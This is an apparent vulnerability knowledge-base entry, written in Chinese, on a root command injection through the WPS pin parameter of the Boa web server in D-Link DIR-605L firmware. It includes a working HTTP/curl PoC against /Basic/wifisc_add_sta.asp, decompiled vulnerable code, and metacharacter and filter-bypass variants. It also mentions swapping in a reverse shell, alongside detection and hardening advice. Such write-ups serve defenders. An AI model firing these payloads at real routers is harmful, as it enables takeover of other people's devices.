---
id: iot-firmware-boa-pin-command-injection
title: D-Link DIR-605L boa start_wps pin 参数命令注入（CNVD-2026-28535）
type: scenario
domain: iot
path: iot
technique: embedded-boa-http-param-sprintf-system-command-injection
aliases:
- CNVD-2026-28535
- DIR-605L
- /bin/boa
- start_wps
- pin=
- iwpriv wlan0 set_mib pin
- wifisc_add_sta.asp
tags:
- iot
- firmware
- dlink
- boa
- command-injection
- http
- cnvd
- embedded
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
affected_versions: D-Link DIR-605L REVA FIRMWARE 1.13
verification:
  verified_by: verifier-V128
  verified_at: '2026-11-06T04:09:18+08:00'
  notes: 已对照原文与20张图核对：/bin/boa start_wps 地址0x45aa28、*(a1+268) 取参、strstr(pin=)、sprintf(iwpriv wlan0 set_mib pin=%s) + system(failed) 均与图01/17一致；图18 gdb 断在 0x45ab80 显示栈中 iwpriv wlan0 set_mib pin=12345678;echo>/var/run/cnvd_test，图19 显示 /var/run/cnvd_test 由 root 创建，证实命令执行且以 root 运行；图02 证实 wifisc_add_sta.asp 调用 start_wps。affected_versions 按原文固件包 DIR-605L_REVA_FIRMWARE_1.13 及图16 Firmware Version 1.13 设置。未验证点：未在真机/本机复跑 PoC；真实设备上 wscd pid/status 前置条件按原文仿真经验推断。
---

## 一句话结论

D-Link DIR-605L 固件的 `/bin/boa` 在 `start_wps()` 中从 HTTP 请求取 `pin=` 后的用户输入，直接 `sprintf("iwpriv wlan0 set_mib pin=%s", wscd)` 后交给 `system()`，未过滤 Shell 元字符；请求 `/Basic/wifisc_add_sta.asp?pin=12345678;echo>/var/run/cnvd_test` 即可执行任意命令（CNVD-2026-28535）。

## 原理

- **入口**：`start_wps()` 从请求对象偏移 `+268` 取参数字符串（`v2 = *(_DWORD *)(a1 + 268)`），`strstr(v2, "pin=")` 定位 `pin=`，`wscd = v3 + 4` 取其后内容。
- **拼接与执行**：`sprintf(failed, "iwpriv wlan0 set_mib pin=%s", wscd)` 把用户输入拼进命令，随后 `system(failed)` 执行；没有任何字符过滤/转义。
- **注入**：Shell 元字符 `;`、`|`、`&&`、`$()`、反引号等都可截断原命令并追加任意命令；案例用 `pin=12345678;echo>/var/run/cnvd_test` 验证。
- **执行前置条件**：`start_wps` 会检查 `/var/run/wscd-wlan0.pid` 与 `/var/tmp/wscd_status` 是否存在，并通过 `apmib_get(59,&n3)` 读取 WPS 模式；只有满足分支才走到 `system`。在真实设备上这些文件/配置通常已存在；仿真时需手动创建/伪造。
- **为什么是漏洞**：`system()` 走 `/bin/sh -c`，用户输入中的元字符被 Shell 解释；正确做法是用 `execve` 传 argv 或对参数做严格白名单/转义。
- **影响**：Boa 通常以 root 运行，命令注入即设备 root RCE；可读取配置/凭据、修改固件、作为内网跳板。

## 触发条件

- 目标为 D-Link DIR-605L（或使用相同 Boa/`start_wps` 代码的固件），Boa Web 服务可达。
- `/Basic/wifisc_add_sta.asp` 等入口可触发 `start_wps()`，且 `pin=` 参数可控。
- `apmib_get(59)` 返回的 WPS 模式满足进入 `system` 的分支；`/var/run/wscd-wlan0.pid`、`/var/tmp/wscd_status` 存在（真实设备通常满足）。
- 若接口需要认证，攻击者需已登录/绕过认证，或接口本身未授权。

## 利用步骤

1. 解包固件（binwalk/unsquashfs），定位 `/bin/boa` 与 `start_wps()`（案例地址 `0x45aa28`）。
2. 在 IDA 中确认 `pin=` 取值、`sprintf` 格式串与 `system` 调用；记录触发 URL（如 `/Basic/wifisc_add_sta.asp`）。
3. 在真实设备或仿真环境中确认前置文件/`apmib_get(59)` 分支；仿真时创建 `var/run/wscd-wlan0.pid`、`var/tmp/wscd_status` 并伪造 `apmib_get` 返回 0。
4. 发送带 Shell 元字符的 `pin` 参数，例如 `pin=12345678;echo>/var/run/cnvd_test`，观察命令是否执行。
5. 验证成功后，可替换为反弹 Shell、下载/写入文件、读取配置等命令；注意目标 Shell/ busybox 支持的命令与路径。
6. 若命令无回显，用写文件/带外通道（DNS/HTTP）确认。

## PoC

```http
GET /Basic/wifisc_add_sta.asp?pin=12345678;echo>/var/run/cnvd_test HTTP/1.1
Host: 192.168.0.1
```

```bash
# 用 curl 保留分号等字符
curl --path-as-is 'http://192.168.0.1/Basic/wifisc_add_sta.asp?pin=12345678;echo>/var/run/cnvd_test'
# 验证：设备上出现 /var/run/cnvd_test
```

```c
// 漏洞核心（IDA 伪代码）
v2 = *(_DWORD *)(a1 + 268);          // HTTP 参数
v3 = strstr(v2, "pin=");
if (v3) {
    wscd = (const char *)(v3 + 4);   // 用户可控
    sprintf(failed, "iwpriv wlan0 set_mib pin=%s", wscd);
    system(failed);                  // 命令注入
}
```

## 变体与关联

- 入口变体：其他 Boa handler 中同样可能存在 `sprintf`/`system` 拼接（如 WPS、诊断、时间同步、固件升级参数）。
- 注入变体：`;`、`|`、`&&`、`$()`、反引号、换行；若过滤空格可用 `${IFS}`、Tab、`$@` 等。
- 仿真变体：用 QEMU user-mode + LD_PRELOAD 伪造 `apmib_init`/`apmib_get` 在本地复现，见 [[code-analysis-reverse-firmware-qemu-user-mips-ldpreload-gdb]]。
- 关联：[[iot-protocol-huawei-hg532-upnp-deviceupgrade-command-injection]]（另一类 IoT 命令注入）、[[code-analysis-reverse-firmware-huawei-squashfs-mips-emulation]]（固件解包/仿真）。

## 检测与防御

- 检测：Boa 访问日志中出现 `pin=` 后带 `;`、`|`、`&&`、`$(`、反引号等元字符；`/var/run`、`/var/tmp` 出现异常文件；`system` 调用参数含用户输入。
- 防御：不要用 `sprintf` + `system` 拼接用户输入；改用 `execve`/`posix_spawn` 传 argv，或对 `pin` 做严格数字白名单（WPS PIN 应为 8 位数字）。
- 加固：Boa 以低权限运行；接口鉴权与 CSRF 防护；固件签名/安全启动；及时更新厂商固件。
